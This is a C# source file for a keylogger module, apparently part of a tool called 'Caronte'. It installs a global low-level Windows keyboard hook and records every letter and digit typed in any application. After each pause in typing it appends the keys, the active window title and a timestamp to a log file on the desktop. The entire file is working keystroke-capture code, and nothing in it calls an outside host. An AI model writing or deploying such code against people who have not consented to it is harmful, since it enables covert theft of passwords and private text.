using Barsa.Commons;
using MediatR;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace Caronte.Modules.Information.GetKeyboardLog
{
    public class GetKeyboardLogQueryHandler : IRequestHandler<GetKeyboardLogQuery, CommonResponse>
    {
        private readonly StringBuilder buffer;
        private readonly string desktopPath;
        private readonly System.Timers.Timer inactivityTimer;
        private const int WH_KEYBOARD_LL = 13;

        private IntPtr hookId = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private LowLevelKeyboardProc _proc = null!;

        public GetKeyboardLogQueryHandler()
        {
            inactivityTimer = new System.Timers.Timer(3000);
            inactivityTimer.Elapsed += OnInactivityTimerElapsed;
            desktopPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "log.txt");
            buffer = new StringBuilder();
        }

        public Task<CommonResponse> Handle(GetKeyboardLogQuery request, CancellationToken cancellationToken)
        {
            _proc = HookCallback;
            hookId = SetHook(_proc);

            inactivityTimer.Start();

            Application.Run();
            UnhookWindowsHookEx(hookId);

            inactivityTimer.Stop();

            return Task.FromResult(new CommonResponse());
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using var curProcess = Process.GetCurrentProcess();
            using var curModule = curProcess.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if (!Utils.KeyFunctions.IsKeyADigit((Keys)vkCode) && !Utils.KeyFunctions.IsKeyAChar((Keys)vkCode))
                    return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);

                buffer.Append(((Keys)vkCode).ToString());

                inactivityTimer.Stop();
                inactivityTimer.Start();
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 512;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, nChars) > 0)
                return buff.ToString();

            return string.Empty;
        }


        private static IntPtr GetModuleHandle(string lpModuleName)
        {
            IntPtr hModule = IntPtr.Zero;
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModuleCollection modules = currentProcess.Modules;

            for (int i = 0; i < modules.Count; i++)
            {
                if (modules[i].ModuleName == lpModuleName)
                {
                    hModule = modules[i].BaseAddress;
                    break;
                }
            }

            return hModule;
        }

        private void OnInactivityTimerElapsed(object sender, ElapsedEventArgs e)
        {
            if (buffer.Length <= 0)
                return;

            var activeWindow = GetActiveWindowTitle();
            File.AppendAllText(desktopPath, $"{activeWindow} - {DateTime.Now}: ");
            File.AppendAllText(desktopPath, buffer.ToString());
            buffer.Clear();

            inactivityTimer.Stop();
        }
    }
}
